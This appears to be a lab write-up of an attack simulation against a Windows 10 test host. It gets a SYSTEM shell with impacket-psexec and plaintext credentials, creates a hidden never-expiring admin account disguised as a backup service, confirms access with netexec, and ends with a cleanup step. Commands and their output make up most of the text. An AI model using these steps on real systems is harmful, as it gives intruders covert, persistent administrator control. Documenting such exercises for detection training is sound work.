# 02 — Attack Simulation (Kali, 192.168.100.106 / BUTCH)

## Step 1 — Foothold: SYSTEM shell via psexec

```bash
impacket-psexec adminlab:'P@ssw0rd'@192.168.100.108
```
Result: v0.14.0 — found writable ADMIN$, uploaded `DmmYUPVU.exe`, opened SVCManager, created/started service `Wlug` → `C:\Windows\system32>` shell as SYSTEM. Windows 10.0.19045.2846.
📸 `evidence/1-kali-psexec-shell.png`

## Step 2 — Create masqueraded backdoor account (never expires)

```cmd
net user svc_backup "B@ckupSvc2026!" /add /fullname:"Backup Service Account" /comment:"Service account for automated backup" /expires:never
```
→ `The command completed successfully.`
Masquerading: name/full name/comment all mimic a legitimate backup service account; `/expires:never` ensures long-term persistence.
📸 `evidence/02-kali-net-user-add.png`

## Step 3 — Add to Administrators (privilege persistence)

```cmd
net localgroup Administrators svc_backup /add
```
→ `The command completed successfully.`
📸 `evidence/03-kali-add-to-administrators.png`

## Step 4 — Verify the backdoor

```cmd
net user svc_backup
net localgroup Administrators
```
→ `svc_backup`: Account active **Yes**, Account expires **Never**, Password last set 10/30/2026 7:52:15 AM, Local Group Memberships **`*Administrators *Users`**, Last logon **Never** (not yet used interactively).
📸 `evidence/04-kali-verify-account.png`

## Step 5 — Prove the backdoor works (from Kali, new terminal)

```bash
netexec smb 192.168.100.108 -u svc_backup -p 'B@ckupSvc2026!'
```
→ `SMB 192.168.100.108 445 DESKTOP-F0JVTQT [*] Windows 10 / Server 2019 Build 19041 x64 (signing:False) (SMBv1:None)` → `[+] DESKTOP-F0JVTQT\svc_backup:B@ckupSvc2026! (Pwn3d!)` — backdoor has admin access. Persistence confirmed functional.
📸 `evidence/05-kali-backdoor-login-test.png`

## Step 6 — Cleanup (lab, after screenshots)

```cmd
net user svc_backup /delete
```
(Generates Event ID 4726 — account deleted — if logged.)
